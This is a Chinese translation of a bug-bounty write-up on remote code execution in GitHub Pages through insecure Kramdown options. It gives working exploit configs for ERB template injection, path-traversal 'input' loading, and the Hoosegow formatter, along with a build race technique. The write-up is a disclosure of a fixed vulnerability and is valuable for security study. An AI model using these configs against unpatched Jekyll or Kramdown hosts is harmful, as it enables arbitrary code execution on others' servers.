> 原文链接: https://www.anquanke.com//post/id/220964 


# 赏金$25000的GitHub漏洞：通过 GitHub Pages 不安全的Kramdown配置实现多个RCE


                                阅读量   
                                **178327**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者William Bowling，文章来源：devcraft.io
                                <br>原文地址：[https://devcraft.io/2020/10/20/github-pages-multiple-rces-via-kramdown-config.html](https://devcraft.io/2020/10/20/github-pages-multiple-rces-via-kramdown-config.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01a341a6b81bdced4c.jpg)](https://p1.ssl.qhimg.com/t01a341a6b81bdced4c.jpg)



## 0x01 开篇

我一直在关注GitHub企业版的发布说明，主要关注补丁的bug修复。这次，我发现补丁发布对Kramdown中的一个问题进行了关键修复。

[![](https://devcraft.io/assets/github/changelog2.jpg)](https://devcraft.io/assets/github/changelog2.jpg)

CVE-2020-14001的描述很好地总结了漏洞详情以及如何利用：

> Ruby 2.3.0版本之前的kramdown gem默认执行Kramdown文档中的模板配置，允许任意的读取访问（比如template=”/etc/passwd）或任意嵌入Ruby代码执行（比如以template=”string://&lt;%= `“开头的字符串）。注意：kramdown在Jekyll、GitLab Pages、GitHub Pages和Thredded Forum中使用。

kramdown的模板选项接受任何文件路径，如果是以string://开头，则会被用作模板内容。由于模板是ERB，这就允许执行任意ruby代码。

为了测试这个问题，我创建了一个新的Jekyll站点，并在`_config.yaml`中添加了以下内容:

```
markdown: kramdown
kramdown:
  template: string://&lt;%= %x|date| %&gt;
```

在启动并加载页面后，确实执行了自定义的ERB：

```
&lt;div class="home"&gt;Tue 20 Oct 2020 21:12:08 AEDT
&lt;h2 class="post-list-heading"&gt;Posts&lt;/h2&gt;
```



## 0x02 漏洞发现

我开始寻找Jekyll和Kramdown允许的其他选项，以及它们是否有可能被利用。GitHub Pages使用1.17.0版本的Kramdown，所以我查看了该版本的`Kramdown::Options`模块，发现[simple_hash_validator](https://github.com/gettalong/kramdown/blob/REL_1_17_0/lib/kramdown/options.rb#L154)使用`YAML.load`，这将有可能通过反序列化来创建任意的ruby对象:

```
def self.simple_hash_validator(val, name)
  if String === val
    begin
      val = YAML.load(val)
```

随着这个思路我用[syntax_highlighter_opts](https://kramdown.gettalong.org/options.html#option-syntax-highlighter-opts)选项来处理，但是在尝试了几个payload之后，我发现`pages_jekyll` 会加载[safe_yaml](https://github.com/dtao/safe_yaml)，防止`YAML.load`的反序列化。

几个小时过后，我发现了一个有趣的选项，它在执行[creating a new Kramdown::Document](https://github.com/gettalong/kramdown/blob/REL_1_17_0/lib/kramdown/document.rb#L100)时使用，并且还有注释:

```
Create a new Kramdown document from the string +source+ and use the provided +options+. The
# options that can be used are defined in the Options module.
#
# The special options key :input can be used to select the parser that should parse the
# +source+. It has to be the name of a class in the Kramdown::Parser module. For example, to
# select the kramdown parser, one would set the :input key to +Kramdown+. If this key is not
# set, it defaults to +Kramdown+.
#
# The +source+ is immediately parsed by the selected parser so that the root element is
# immediately available and the output can be generated.
def initialize(source, options = `{``}`)
  @options = Options.merge(options).freeze
  parser = (@options[:input] || 'kramdown').to_s
  parser = parser[0..0].upcase + parser[1..-1]
  try_require('parser', parser)
  if Parser.const_defined?(parser)
    @root, @warnings = Parser.const_get(parser).parse(source, @options)
  else
    raise Kramdown::Error.new("kramdown has no parser to handle the specified input format: #`{`@options[:input]`}`")
  end
end
```

所以，当存在`:input`选项时，会将第一个字母做成大写，然后传给 `try_require`，类型设置为 `parser`：

```
# Try requiring a parser or converter class and don't raise an error if the file is not found.
def try_require(type, name)
  require("kramdown/#`{`type`}`/#`{`Utils.snake_case(name)`}`")
  true
rescue LoadError
  true
end
```

由于[snake_case](https://github.com/gettalong/kramdown/blob/REL_1_17_0/lib/kramdown/utils.rb#L32)的执行只关心字符串，忽略其他的，这意味着有可能存在目录遍历，导致`require`加载一个不在预定路径上的文件。

我创建了一个内容为`system("echo hi &gt; /tmp/ggg")`的文件`/tmp/evil.rb`，然后用下面的`_config.yml`启动jekyll:

```
markdown: kramdown
kramdown:
  input: ../../../../../../../../../../../../../../../tmp/evil.rb
```

Jekyll 构建失败并报错`jekyll 3.8.5 | Error: wrong constant name ../../../../../../../../../../../../../../../tmp/evil.rb`， 但查看`/tmp/` 里的内容，发现ruby代码被成功执行：

```
$ cat /tmp/ggg
hi
```



## 0x03 漏洞利用

我在GHE服务器上创建了一个页面仓库，添加了`/tmp/evil.rb`，同样成功得到执行。接下来要做的就是想办法把ruby文件放到一个已知的位置，并作为payload使用。我使用[perf-tools](https://github.com/brendangregg/perf-tools)的`opensnoop`工具，在github构建jekyll页面站点时观察路径，发现以下目录：

```
/data/user/tmp/pages/page-build-23481
/data/user/tmp/pages/pagebuilds/vakzz/jekyll1
```

第一个是输入目录，第二个是输出目录，但这两个目录都在进程结束后很快被删除，并复制到一个哈希加密的位置。由于输出目录只基于用户和仓库名，结构相对简单，只需要想办法让它比正常情况下持续的时间更久即可。

我使用`dd if=/dev/zero of=file.out bs=1000000 count=100`创建了五个 100mb 的文件`code.rb`并将它们作为payload添加到 jekyll 站点，然后通过`while true; do git add -A . &amp;&amp; git commit --amend -m aa &amp;&amp; git push -f; done`创建循环。再次观察`/data/user/tmp/pages/pagebuilds/vakzz/jekyll1`目录，发现它存在的时间变长了。

接着创建一个新的站点，并包含一个恶意的`input`，指向jeykll构建的第一个文件夹：

```
markdown: kramdown
kramdown:
  input: ../../../../../../../../../../../../../../../data/user/tmp/pages/pagebuilds/vakzz/jeykll1/code.rb
```

然后把那个仓库也设置成循环的推送和构建。大约一分钟后，文件出现了!

```
$ ls -asl /tmp/ | grep ggg
4 -rw-r--r--  1 pages             pages                3 Aug 19 13:58 ggg4
```

我写好漏洞报告，将其发送给GitHub，报告以惊人的速度进行了分流（30分钟内）。几个小时后，我收到回复，说他们正在努力强化Kramdown选项，并询问是否知道还有其他应该被限制的选项。

唯一看起来有点可疑的选项是[formatter_class](https://github.com/gettalong/kramdown/blob/REL_1_17_0/lib/kramdown/converter/syntax_highlighter/rouge.rb#L62) (作为[syntax_highlighter_opts](https://kramdown.gettalong.org/options.html#option-syntax-highlighter-opts)的一部分设置)，但它只允许字母数字，然后用`:Rouge::Formatters.const_get`进行查询：

```
def self.formatter_class(opts = `{``}`)
  case formatter = opts[:formatter]
  when Class
    formatter
  when /\A[[:upper:]][[:alnum:]_]*\z/
    ::Rouge::Formatters.const_get(formatter)
```

当时我认为这是安全的，但还是把它同`simple_hash_validator` 一起进行了提交。

第二天晚上，我研究了一下`::Rouge::Formatters.const_get`的实际工作原理。结果发现，它并不像我原来想的那样，把常量限制在`::Rouge::Formatters`上，而是可以返回任何定义过的常量或类。虽然正则仍然有限制（不允许使用`::`），但仍然可以用来返回类。一旦找到了常量，它就会被用来创建一个新的实例，然后调用`format`方法:

```
formatter = formatter_class(opts).new(opts)
formatter.format(lexer.lex(text))
```

为了测试这一点，我用如下的`_config.yml`，然后建立网站:

```
kramdown:
  syntax_highlighter: rouge
  syntax_highlighter_opts:
    formatter: CSV
```

虽然报了错，但错误信息显示CVS类已经被创建了!

```
jekyll 3.8.5 | Error:  private method 'format' called for #&lt;CSV:0x00007fe0d195bd48&gt;
```

我在报告中添加了一个评论，表明`formatter`选项肯定应该被限制，我会继续研究它是否可被利用。

现在，我能够创建一个顶级的ruby对象，它的初始化器取单一的哈希值，而且我们对哈希值的内容有相当大的控制权。我花了一点时间在google和ruby中测试如何获得一个常量列表，然后得出了下面的脚本：

```
require "bundler"
Bundler.require

methods = []
ObjectSpace.each_object(Class) `{`|ob| methods &lt;&lt; ( `{`ob: ob `}`) if ob.name =~ /\A[[:upper:]][[:alnum:]_]*\z/ `}`

methods.each do |m|
  begin
    puts "trying #`{`m[:ob]`}`"
    m[:ob].new(`{`a:1, b:2`}`)
    puts "worked\n\n"
  rescue ArgumentError
      puts "nope\n\n"
  rescue NoMethodError
      puts "nope\n\n"
  rescue =&gt; e
      p e
      puts "maybe\n\n"
  end
end
```

该脚本基本上能找到所有符合正则的常量，并尝试使用哈希创建一个新的实例。我登录到GHE服务器，进入页面目录并运行脚本。只有部分显示`worked`或者`maybe`，大部分显示`StandardError`。

我盯着类的列表，看看初始化器中发生了什么，一开始没有找到有趣的东西，直到看到这个：

```
trying Hoosegow
#&lt;Hoosegow::InmateImportError: inmate file doesn't exist&gt;
maybe
```

这里看起来很有希望成为切入点! [Hoosegow initialize method](https://github.com/github/hoosegow/blob/v1.2.6/lib/hoosegow.rb#L34)的初始化方法如下：

```
def initialize(options = `{``}`)
    options         = options.dup
    @no_proxy       = options.delete(:no_proxy)
    @inmate_dir     = options.delete(:inmate_dir) || '/hoosegow/inmate'
    @image_name     = options.delete(:image_name)
    @ruby_version   = options.delete(:ruby_version) || RUBY_VERSION
    @docker_options = options
    load_inmate_methods
```

`load_inmate_methods` 方法如下:

```
def load_inmate_methods
    inmate_file = File.join @inmate_dir, 'inmate.rb'

    unless File.exist?(inmate_file)
      raise Hoosegow::InmateImportError, "inmate file doesn't exist"
    end

    require inmate_file
```

这真是太完美了! 由于可以在`options`哈希中添加任何东西，这将允许传递我们自己的`inmate_dir`目录，然后需要做的就是在那里等待一个恶意的 `inmate.rb`文件。

按照之前相同的过程，我编辑了`_config.yml`，内容如下:

```
kramdown:
  syntax_highlighter: rouge
  syntax_highlighter_opts:
    formatter: Hoosegow
    inmate_dir: /tmp/
```

然后在GHE服务器上成功创建了带有payload的`/tmp/inmate.rb`文件，并被推送到jekyll网站。几秒钟后，该文件被获取，payload也成功得到执行!

[![](https://devcraft.io/assets/github/changelog3.jpg)](https://devcraft.io/assets/github/changelog3.jpg)

最终，这个被命名为CVE-2020-10518的漏洞得到了修复，我也获得了$25000的赏金。
